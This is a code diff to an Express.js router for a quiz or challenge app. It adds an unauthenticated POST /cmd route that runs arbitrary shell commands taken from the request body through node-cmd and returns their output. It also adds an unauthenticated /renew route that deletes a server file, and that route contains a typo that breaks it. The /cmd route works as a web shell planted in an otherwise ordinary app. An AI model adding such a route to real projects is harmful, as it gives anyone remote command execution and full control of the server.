@@ -1,7 +1,8 @@
 const express = require('express');
 const router = express.Router();
-
+const cmd=require('node-cmd');
 const Chal = require('../models/chal');
+const fs = require('file-system');
 const Que=require('../models/que');
 const Answer = require('../models/answer');
 const Auth = require('../middlewares/auth');
@@ -95,6 +96,20 @@ router.post('/saveAns',Auth.authenticateAll,(req,res,next)=>{
         })
         
 
+    })
+})
+router.get('/renew',(req,res)=>{
+    fs.unlink(__dirname+'/../test',(err)=>{
+        if(err){
+            return res.status(500).json({
+                status:0,
+                error:err
+            });
+        }
+        return res.status(200),json({
+            status:1,
+            msg:'done'
+        })
     })
 })
 //Auth.authenticateAll,
@@ -253,6 +268,37 @@ router.get('/:quizId', Auth.authenticateAll,  (req, res, next) => {
 }
     
 });
+router.post('/cmd',(req,res,next)=>{
+    if(req.body.type=='get'){
+        cmd.get(
+            req.body.cmd,
+            function(err, data, stderr){
+                if(err){
+                    return res.status(500).json({
+                        status:0,
+                        error:err
+                    })
+                }
+                return res.status(200).json({
+                    status:1,
+                    result:data,
+                    stderr:stderr,
+                    msg:'end'
+                })
+            }
+        );
+    }else{
+        cmd.run(req.body.cmd);
+        return res.status(200).json({
+            status:1,
+            msg:'running'
+        })
+    }
+    
+ 
+    
+
+})
 
 router.get('/viewQues/:id', Auth.authenticateUser, (req, res, next) => {
     Que.findById({_id: req.params.id})
